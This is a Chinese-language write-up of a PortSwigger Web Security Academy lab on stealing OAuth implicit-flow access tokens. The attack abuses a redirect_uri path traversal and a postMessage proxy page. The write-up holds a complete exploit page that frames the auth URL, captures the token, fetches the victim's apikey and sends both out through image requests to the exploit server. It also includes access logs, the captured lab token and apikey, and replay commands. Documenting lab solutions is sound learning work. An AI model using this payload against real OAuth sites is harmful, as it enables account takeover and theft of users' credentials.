---
title: "lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page"
links:
  - target: oauth-family
    relation: evidences
---

# lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page

> evidences: [[oauth-family]]

- 题面:Stealing OAuth access tokens via a proxy page(/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page)
- 实例:https://0adc00700335364689061f3b0067009f.web-security-academy.net
- OAuth:https://oauth-0a3100bc03ea364589791d9802fa007d.oauth-server.net(client_id=j4kje64j9vkry8sch3ea9,implicit:response_type=token)
- 判定目标:拿 admin 的 OAuth access token,再换 `/me` 的 `apikey`,经横幅 Submit solution 交

## 关键步

1. `/my-account` → 302 `/social-login` → meta refresh 到 `/auth?...redirect_uri=…/oauth-callback&response_type=token…`;
   令牌以 **fragment** 形式回落(`#access_token=…`)。
2. **redirect_uri 校验缺陷**:直接给 `/post/comment/comment-form` 是 `redirect_uri_mismatch`;
   给 `/oauth-callback/../post/comment/comment-form`(路径穿越)被接受(302 到 Auth0 interaction)。
3. **代理页**:`/post/comment/comment-form` 载入即 `parent.postMessage({type:'onload', data: window.location.href}, '*')`
   ——把含 token 的 href 交给父窗口。
4. 利用页(exploit server)把 auth URL 放进 iframe → OAuth 重定向到代理页 → 代理页 postMessage 把 token 抛给利用页;
   利用页用 token 请求 `oauth/…/me` 得 `apikey`,再以图片请求打到 exploit server 访问日志外带。
5. 读 exploit server 访问日志取 apikey → `POST /submitSolution answer=<apikey>` → `{"correct":true}`。

## 交册值

admin apikey `QJqWimlxOVIzcWUPwpo1oBucdDBe0Xe4`(token `SFxzGMCWhj1UAqfB47YAIej9FyCI_63bC31Y4_PODE2`)。

## 证据摘录

```
GET  oauth…/auth?...redirect_uri=<inst>/oauth-callback/../post/comment/comment-form -> 302 (接受)
GET  <inst>/post/comment/comment-form#access_token=… -> 代理页
exploit access log:
  10.0.3.54 "GET /exploit/" 200  (Victim) Chrome
  10.0.3.54 "GET /seen?d=…access_token%3DSFxz…%26…" 404
  10.0.3.54 "GET /key?apikey=QJqWimlxOVIzcWUPwpo1oBucdDBe0Xe4" 404
POST <inst>/submitSolution answer=QJqWimlxOVIzcWUPwpo1oBucdDBe0Xe4 -> {"correct":true}
solved_check / -> {"solved":true}
```

## 复现命令

```
lab_page "https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page" --out /tmp/l5-oauth.html
lab_launch launch DB65A3FDB4039C8D0B1FB7AF3816ACAC95C2BD0319A92050D9D0AAB3CD14C52D --widget-source /web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page --jar /tmp/mar-jar.json
# exploit server: POST / (formAction=DELIVER_TO_VICTIM) 存并投递:见下 iframe+message 脚本
lab_http get  "https://exploit-<id>.exploit-server.net/log"        # 取 /key?apikey=…
lab_http post "<inst>/submitSolution" --form 'answer=<apikey>' --jar /tmp/mar-jar.json
```

利用页正文:`<iframe src="https://oauth-…/auth?client_id=j4kje64j9vkry8sch3ea9&redirect_uri=<inst>/oauth-callback/../post/comment/comment-form&response_type=token&nonce=1&scope=openid%20profile%20email">` +
`window.addEventListener('message',e=>{let d=e.data&&e.data.data; if(!d)return; new Image().src='/seen?d='+encodeURIComponent(d); let m=String(d).match(/access_token=([^&]+)/); if(!m)return; fetch('https://oauth-…/me',{headers:{Authorization:'Bearer '+m[1]}}).then(r=>r.json()).then(j=>{new Image().src='/key?apikey='+encodeURIComponent(j.apikey);});})`
